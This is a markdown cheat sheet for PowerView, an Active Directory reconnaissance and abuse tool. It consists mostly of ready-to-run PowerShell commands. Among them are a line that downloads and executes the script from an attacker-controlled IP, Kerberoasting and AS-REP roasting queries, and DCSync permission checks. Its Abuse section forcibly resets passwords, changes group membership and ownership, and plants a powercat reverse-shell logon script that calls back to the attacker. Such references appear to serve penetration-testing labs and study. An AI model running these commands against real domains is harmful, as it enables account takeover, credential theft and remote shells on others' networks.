---
tags:
  - tool
  - active_directory
---
# PowerView

Gain situational awareness in Windows Active Directory environments

```bash
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

See [here](https://powersploit.readthedocs.io/en/latest/Recon/) for various examples for how each function can be used.

## Capabilities

### Users, Groups and Computers

```powershell
# Import PowerView.ps1
iex(new-object net.webclient).downloadstring("http://$OUR_IP:$PORT/PowerView.ps1")

# Enumerate domain information (check Pdc)
Get-NetDomain

# Check hostnames associated with IP addresses
Get-NetComputer | select dnshostname | Resolve-IPAddress

# Get domain password policy
Get-DomainPolicy

# Enumerate user objects
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

# Enumerate group objects
Get-NetGroup
Get-NetGroup | select cn
Get-NetGroup "$GROUP" | select member
Get-NetGroup -UserName $NAME | select cn
Get-NetGroup -AdminCount | select cn

# Enumerate managed security groups (groups with owners that can modify them without having full administrative privileges)
Get-DomainManagedSecurityGroup | select GroupName

# Enumerate computer objects
Get-NetComputer
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion,lastlogontimestamp,useraccountcontrol
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion,lastlogontimestamp,useraccountcontrol | Export-Csv .\domain_computers.csv -NoTypeInformation

# Enumerate local groups/users on other hosts
Get-NetLocalGroup -ComputerName $COMPUTER | select GroupName
Get-NetLocalGroupMember -ComputerName $COMPUTER
Get-NetLocalGroupMember -ComputerName $COMPUTER -GroupName 'Remote Management Users'

# Check shares
Get-NetShare -ComputerName $COMPUTER

# Query session information
Get-NetSession -ComputerName $COMPUTER

# Find hosts on the local domain where the current user has local administrator access
Find-LocalAdminAccess

# Test local admin access on another host
Test-AdminAccess -ComputerName $COMPUTER

# Discover domain shares
Find-NetShare
Find-NetShare -CheckShareAccess

# Index domain share (sysvol in this example)
ls \\dc1.corp.com\sysvol\corp.com\

# Query existing descriptions
Get-NetUser * | select samaccountname,description | where {$_.Description -ne $null}
Get-NetComputer * | select samaccountname,description | where {$_.Description -ne $null}
Get-DomainObject * | select samaccountname,description | where {$_.Description -ne $null}

# Get user UAC bits, ones that are set for the user are marked with a +
Get-NetUser $USER | ConvertFrom-UACValue -showall

# Get compouter object uac values
Get-NetComputer | select dnshostname, useraccountcontrol

# Query users with PASSWD_NOTREQD set
Get-NetUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# View OUs
Get-DomainOU | select name

# View password last set times
Get-NetUser -Properties samaccountname,pwdlastset,lastlogon -Domain $DOMAIN | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset
Get-NetUser -Properties samaccountname,pwdlastset,lastlogon -Domain $DOMAIN | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }

# Get AS-REP roastable users
Get-DomainUser -PreauthNotRequired

# Enumerate SPNs linked to users
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# View users/computers with Kerberos constrained delegation
Get-NetUser -TrustedToAuth | select samaccountname,useraccountcontrol,memberof
Get-NetComputer -TrustedToAuth | select dnshostname,useraccountcontrol

# View users/computers with Kerberos unconstrained delegation
Get-NetUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | select samaccountname,useraccountcontrol,memberof
Get-NetComputer -Unconstrained | select dnshostname,useraccountcontrol

# Query object that created a computer
Convert-SIDToName (New-Object System.Security.Principal.SecurityIdentifier((Get-DomainComputer -Identity $COMPUTER -Properties 'ms-DS-CreatorSID').'ms-DS-CreatorSID', 0)).Value

# Query number of machines created from an object
(Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid | where { (New-Object System.Security.Principal.SecurityIdentifier($_."ms-ds-creatorsid",0)).Value -eq (ConvertTo-SID $PRINCIPAL) }).Count

# Identify FSPs configured in the target domain
Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain $DOMAIN | select @{Name='objectsid';Expression={Convert-SIDToName -SID $_.objectsid}}

# Enumerating users who belongs to groups within the target domain (doesnt work with powerview.py)
Get-DomainForeignGroupMember -Domain $DOMAIN | select @{Name='MemberName';Expression={Convert-SIDToName -SID $_.MemberName}},GroupName,MemberDomain,GroupDomain
```

### ACLs

`Get-ObjectAcl -Identity stephanie` retrieves the ACL with the `ObjectID` `stephanie`. The resulting list shows `SecurityIdentifiers` that have `ActiveDirectoryRights` over `stephanie`.

```powershell
# Retrieve the ACL for the specified object
Get-ObjectAcl -ResolveGUIDs -Identity $TARGET | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectAceType | sort -Property SecurityIdentifier

# View an objects ACE's over another object
Get-ObjectACL -ResolveGUIDs -Identity $TARGET | where { $_.SecurityIdentifier -eq (Convert-NameToSid $PRINCIPAL) } | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectAceType | sort -Property SecurityIdentifier

# Check if any users have inbound "GenericAll" over a specified object
Get-ObjectAcl -ResolveGUIDs -Identity $TARGET | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectAceType | sort -Property SecurityIdentifier

# View outbound ACE's for a SID (can take a while)
Get-ObjectACL -ResolveGUIDs -Identity * | where { $_.SecurityIdentifier -eq (Convert-NameToSid $PRINCIPAL) } | select ActiveDirectoryRights,ObjectAceType,@{Name='ObjectSID';Expression={Convert-SIDToName -SID $_.ObjectSID}} | sort -Property ObjectSID

# Check domain for DCSync permissions
Get-ObjectAcl "$DOMAIN_DN" -ResolveGUIDs | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectAceType | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | sort -Property SecurityIdentifier

# Query non-default SIDs that have privileges over GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' } | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectDN | sort -Property SecurityIdentifier

# View outbound ACE's over foreign principals in a target domain
Get-ObjectACL -ResolveGUIDs -Identity * -domain $DOMAIN | where { $_.SecurityIdentifier -eq (Convert-NameToSid $PRINCIPAL) } | select ActiveDirectoryRights,ObjectAceType,@{Name='ObjectSID';Expression={Convert-SIDToName -SID $_.ObjectSID}} | sort -Property ObjectSID

# Query users with non-default Foreign write ACLs (can take a while)
Get-DomainObjectAcl -Domain $DOMAIN -ResolveGUIDs -Identity * | ? { ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and ($_.AceType -match 'AccessAllowed') -and ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.SecurityIdentifier -notmatch @{Name='SecurityIdentifier';Expression={Get-DomainSID $DOMAIN}}) } | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectAceType,@{Name='ObjectSID';Expression={Convert-SIDToName -SID $_.ObjectSID}} | sort -Property SecurityIdentifier
```

### GPOs

```powershell
# View GPO names
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerName $COMPUTER | select displayname

# Enumerate domain user GPO rights
Get-DomainGPO | Get-ObjectAcl | ? { $_.SecurityIdentifier -eq (Convert-NameToSid $OBJECT) }
Get-GPO -Guid $GUID
```

**Exploit Paths:**

- Add Registry Autoruns
- Software Installation (Install MSI Package that exists on a share)
- Scripts in the Startup/Shutdown for a Machine or User
- Create Shortcuts on Desktops that point to files
- Scheduled Tasks

### Trusts

```powershell
# Quickly check trusts
Get-DomainTrust | select sourcename,targetname,trusttype,trustattributes,trustdirection

# Enumerate all trusts in current domain and reachable domains
Get-DomainTrustMapping | select sourcename,targetname,trusttype,trustattributes,trustdirection

# Find users in the current domain with foreign group membership
Find-ForeignGroup
```

### Abuse

Add `-Credential $cred` to any command to execute in the context of another user as seen in example 2.

```powershell
# Change a users password as the current user
$newPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword -Verbose

# Change a user's with another user's credentials
$secPassword = ConvertTo-SecureString '$OUR_PASSWD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('$NETBIOS\$OUR_USER', $secPassword)
$newPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity '$TARGET_USER' -AccountPassword $newPassword -Credential $cred -Verbose

# Add/remove a domain group member
Add-DomainGroupMember -Identity '$GROUP' -Members '$USER' -Verbose
Remove-DomainGroupMember -Identity '$GROUP' -Members '$USER' -Verbose

# Create/remove a fake SPN
Set-DomainObject -Identity '$TARGET_USER' -SET @{serviceprincipalname='beans/XDDD'} -Verbose
Set-DomainObject -Identity '$TARGET_USER' -Clear serviceprincipalname -Verbose

# Abuse WriteOwner
Set-DomainObjectOwner '$TARGET_OBJECT' -OwnerIdentity '$OUR_USER' -Verbose
Add-DomainObjectAcl '$TARGET_OBJECT' -PrincipalIdentity '$OUR_USER' -Rights All -Verbose

# Request ST to crack offline for target user
Get-DomainSPNTicket '$TARGET_USER' -Credential $cred | fl

# Leverage GenericWrite to set logon script for a target user
echo 'powercat -c $OUR_IP -p $PORT -e powershell' >> powercat.ps1
cp powercat.ps1 C:\Windows\System32\spool\drivers\color\powercat.ps1
Set-DomainObject -Identity '$TARGET_USER' -SET @{scriptpath="C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1"} -Verbose
```

### Errors

```powershell
# Add credential
$secPassword = ConvertTo-SecureString $PASSWD -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('$USER', $secPassword)
Get-DomainUser -Credential $credential -FindOne
```
